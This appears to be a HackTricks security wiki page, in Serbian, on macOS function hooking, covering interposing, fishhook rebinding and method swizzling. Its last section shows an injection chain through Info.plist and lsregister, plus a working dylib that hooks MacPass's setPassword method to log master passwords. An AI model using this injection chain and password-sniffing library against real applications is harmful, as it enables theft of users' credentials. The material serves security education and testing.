# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Kreiraj **dylib** sa **`__interpose` (`__DATA___interpose`)** sekcijom (ili sekcijom označenom sa **`S_INTERPOSING`**) koja sadrži tuple-ove **pokazivača na funkcije** koji referišu na **originalnu** i **zamensku** funkciju.

Zatim **inject**-uj dylib pomoću **`DYLD_INSERT_LIBRARIES`** (interposing mora da se desi pre nego što se main app učita). Naravno, [**restrikcije**] primenjene na upotrebu **`DYLD_INSERT_LIBRARIES`** važe i ovde.](macos-library-injection/index.html#check-restrictions)

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> Promenljiva okruženja **`DYLD_PRINT_INTERPOSING`** može da se koristi za debagovanje interposing-a i ispisivaće interpose proces.

Takođe imaj na umu da se **interposing dešava između procesa i učitanih biblioteka**, i ne radi sa shared library cache.

### Dynamic Interposing

Sada je takođe moguće interpose-ovati funkciju dinamički koristeći funkciju **`dyld_dynamic_interpose`**. Ovo omogućava da se funkcija interpose-uje **programski** u **runtime-u** umesto da se to radi samo od **početka**.

Potrebno je samo navesti **tuple-ove** za **funkciju koja se zamenjuje i zamensku** funkciju.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Ponovno povezivanje Import Table (fishhook-style)

Ako već imate izvršavanje koda **unutar procesa** i želite da hook-ujete **importovanu C funkciju** bez ponovnog pokretanja targeta, veoma česta tehnika je **symbol rebinding** (popularizovana od strane **`fishhook`**).

Umesto korišćenja sekcije **`__interpose`**, ova tehnika prolazi kroz Mach-O metapodatke (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) i **prepisuje import slot** koji koristi trenutna slika. Ovo je veoma korisno za hook-ovanje funkcija u procesu koji je **već pokrenut** ili za hook-ovanje **samo jedne slike** pomoću **`rebind_symbols_image`**.

> [!TIP]
> Ovo utiče samo na pozive koji zaista prolaze kroz **import pointer**. Ako se target funkcija **poziva direktno unutar iste slike**, ne postoji importovani slot koji bi se prepisao, pa ova tehnika neće videti to mesto poziva.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Na novijim verzijama macOS-a mnogi rebinding targeti više nisu u writable **`__DATA`** stranicama. Rebinders obično moraju privremeno da učine **`__DATA_CONST`** writable pre patchovanja pokazivača. Pored toga, na Apple Silicon / **`arm64e`** treba očekivati authenticated pointers i dodatnu indirection u **`__AUTH_CONST.__auth_got`**, tako da rebinder koji skenira samo klasične lazy/non-lazy symbol pointer sekcije može da propusti neke call sites.

> [!CAUTION]
> **`arm64e`** ABI koristi **Pointer Authentication (PAC)** za mnoge function pointers. Blind pointer writes koji su ranije radili na Intel-u mogu da pokvare call site na Apple Silicon. Kada pišete sopstveni rebinder ili inline hooker, budite spremni da koristite **`<ptrauth.h>`** helpers kao što su **`ptrauth_sign_unauthenticated`** ili **`ptrauth_auth_and_resign`** i testirajte posebno na **`arm64e`** targetima.

Za više detalja o **`__AUTH`**, **`__AUTH_CONST`** i **`__auth_got`**, pogledajte [ovu stranicu](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

U ObjectiveC ovako se poziva metoda: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Potrebni su **object**, **method** i **params**. A kada se metoda poziva, **msg is sent** koristeći funkciju **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Object je **`someObject`**, metoda je **`@selector(method1p1:p2:)`** a argumenti su **value1**, **value2**.

Prateći object strukture, moguće je doći do **array of methods** gde su **names** i **pointers** ka method code **located**.

> [!CAUTION]
> Napomena da pošto se methods i classes pristupa na osnovu njihovih names, ove informacije su sačuvane u binary-ju, pa je moguće izvući ih pomoću `otool -ov </path/bin>` ili [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accessing the raw methods

Moguće je pristupiti informacijama o methods kao što su name, number of params ili address, kao u sledećem primeru:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

Funkcija **`method_exchangeImplementations`** omogućava da se **promeni** **adresa** **implementacije** **jedne funkcije za drugu**.

> [!CAUTION]
> Dakle, kada se jedna funkcija pozove, ono što se **izvršava je druga**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> U ovom slučaju, ako **implementation code of the legit** metoda **proverava** **method** **name**, mogla bi da **detektuje** ovo swizzling i spreči njegovo izvršavanje.
>
> Sledeća tehnika nema ovo ograničenje.

### Method Swizzling with method_setImplementation

Prethodni format je čudan jer menjate implementation 2 metoda jedan drugim. Koristeći funkciju **`method_setImplementation`** možete **promeniti** **implementation** jedne **method for the other one**.

Samo zapamtite da **sačuvate adresu implementation original one** ako planirate da je pozovete iz nove implementation pre nego što je prepišete, jer će kasnije biti mnogo komplikovanije da se ta adresa pronađe.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

Na ovoj stranici su razmatrani različiti načini za hookovanje funkcija. Međutim, oni su uključivali **pokretanje koda unutar procesa radi napada**.

Da bi se to uradilo, najlakša tehnika za korišćenje je injekcija [Dyld putem environment variables ili hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). Međutim, pretpostavljam da bi se ovo moglo uraditi i putem [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port).

Međutim, obe opcije su **ograničene** na **unprotected** binarne fajlove/procese. Pogledajte svaku tehniku da biste saznali više o ograničenjima.

Ipak, function hooking napad je veoma specifičan, napadač će to uraditi da bi **ukrao osetljive informacije iznutra procesa** (ako nije tako, jednostavno biste uradili process injection napad). A te osetljive informacije mogu se nalaziti u aplikacijama koje je korisnik preuzeo, kao što je MacPass.

Dakle, vektor napada bi bio ili da se pronađe ranjivost ili da se ukloni potpis aplikacije, i da se kroz Info.plist aplikacije ubaci **`DYLD_INSERT_LIBRARIES`** env variable dodavanjem nečega poput:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
i zatim **ponovo registrujte** aplikaciju:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Dodaj u tu biblioteku hooking kod za exfiltration informacija: Passwords, messages...

> [!CAUTION]
> Imajte na umu da u novijim verzijama macOS-a, ako **stripujete signature** binarnog fajla aplikacije i on je prethodno bio izvršen, macOS **neće više izvršavati aplikaciju**.

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Reference

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
- [https://github.com/facebook/fishhook](https://github.com/facebook/fishhook)
- [https://clang.llvm.org/docs/PointerAuthentication.html](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
